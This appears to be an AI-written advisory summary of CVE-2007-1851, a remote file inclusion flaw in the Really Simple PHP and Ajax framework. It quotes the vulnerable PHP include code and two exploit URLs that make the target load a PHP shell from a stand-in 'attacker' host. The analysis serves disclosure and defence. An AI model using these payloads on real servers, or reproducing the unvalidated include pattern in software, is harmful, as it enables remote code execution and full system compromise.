Based on the provided content, here's a breakdown of the vulnerability described in CVE-2007-1851:

**Vulnerability Details:**

*   **Root Cause:** The vulnerability stems from a lack of proper input sanitization in the `Controller_v5.php` and `Controller_v4.php` files of the Really Simple PHP and Ajax (RSPA) framework. Specifically, the `__IncludeFilePHPClass`, `__ClassPath`, and `__class` parameters are not validated before being used in `require_once` or `include` statements.

*   **Weaknesses/Vulnerabilities Present:**
    *   **Remote File Inclusion (RFI):** The primary vulnerability is RFI. The application directly uses user-supplied input to include files, making it susceptible to including malicious files from remote locations.

*   **Impact of Exploitation:**
    *   **Arbitrary Code Execution:** Successful exploitation allows an attacker to execute arbitrary PHP code on the server by including a malicious PHP file. This can lead to a full compromise of the affected system.
    *   **Data Compromise:**  An attacker could potentially gain access to sensitive data, modify or delete files, and pivot to other systems on the network.
    
*   **Attack Vectors:**
    *   **HTTP GET Requests:** The vulnerability can be exploited via specially crafted HTTP GET requests by setting the vulnerable parameters in the query string.
    *  **Vulnerable Parameters**: `__IncludeFilePHPClass`, `__ClassPath` and `__class`

*   **Required Attacker Capabilities/Position:**
    *   **Network Access:** The attacker needs to be able to send HTTP requests to the vulnerable application.
    *   **Malicious File Hosting:**  The attacker requires a location to host a malicious PHP file that can be included by the target application.

**Technical Details:**
The vulnerable code sections are present in both `Controller_v5.php` and `Controller_v4.php`:

```php
// IncludeFile for PHP Class
if ($_REQUEST['__IncludeFilePHPClass']){
	$filename = $_REQUEST['__IncludeFilePHPClass'];
	require_once ($filename);
}
```
```php
// ClassFile + ClassPath
include ("../components/Form.class.php");
if ($_REQUEST["__ClassPath"]=="null" || empty($_REQUEST["__ClassPath"])){
	$filename = $RSPA['class_folder'].$className.$RSPA['class_extension'];
}else{
	$filename = $_REQUEST["__ClassPath"].$className.$RSPA['class_extension'];
}
require_once($filename);

```

**Exploit Example:**
The provided exploit demonstrates how an attacker can include a remote PHP file:

```
http://[HOST]/rspa/framework/Controller_v5.php?__IncludeFilePHPClass=http://attacker/phpshell.txt/?
http://[HOST]/rspa/framework/Controller_v4.php?__ClassPath=http://attacker/phpshell.txt/?
```
In these examples, `http://attacker/phpshell.txt/?` would contain malicious PHP code to be executed on the target.

**Additional Notes:**
*   The exploit database entry also references CVE-2007-1982 but the primary vulnerability information is related to CVE-2007-1851.
* The application's version is specified as `rspa-2007-03-23`.
* The content from secunia.com is related to Flexera's vulnerability research services and not specific to the identified vulnerability.
* The content from vupen.com is unrelated and a placeholder.

In summary, CVE-2007-1851 is a Remote File Inclusion vulnerability present in the Really Simple PHP and Ajax framework due to insufficient input validation, allowing for arbitrary PHP code execution by including remote resources.
